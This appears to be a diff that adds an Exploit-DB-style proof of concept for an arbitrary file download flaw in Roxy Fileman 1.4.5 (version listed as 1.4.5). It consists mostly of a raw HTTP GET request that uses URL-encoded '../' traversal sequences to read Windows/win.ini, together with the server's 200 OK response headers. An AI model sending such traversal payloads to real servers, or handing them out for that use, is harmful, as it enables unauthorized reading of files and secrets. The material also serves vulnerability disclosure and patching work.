@@ -1,0 +1,38 @@
+# Exploit Title: Roxy Fileman 1.4.5 - Arbitrary File Download
+# Dork: N/A
+# Date: 2019-01-16
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.roxyfileman.com/
+# Software Link: http://www.roxyfileman.com/download.php?f=1.4.5-php
+# Version: 1.4.5
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/fileman/php/download.php?f=/[PATH]/fileman/Uploads/[FILE]
+# 
+
+GET /[PATH]/fileman/php/download.php?f=%2FExploitDb%2FRoxyFileman-1.4.5-php%2Ffileman%2FUploads%2F%2F%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fWindows/win.ini HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=2lj2q69rvodstr9g2c9ki3k3j6; GeniXCMS-Installation=rsb95ndeo38fi0qo5376ku0o74; GeniXCMS-uxTCOmgGby9cYrSEFhS2=iuac7ooh77hghvbq7afkn0kl13; roxyld=%2FExploitDb%2FRoxyFileman-1.4.5-php%2Ffileman%2FUploads; roxyview=list
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Tue, 15 Jan 2019 22:19:32 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Disposition: attachment; filename="win.ini"
+Content-Length: 564
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: application/force-download
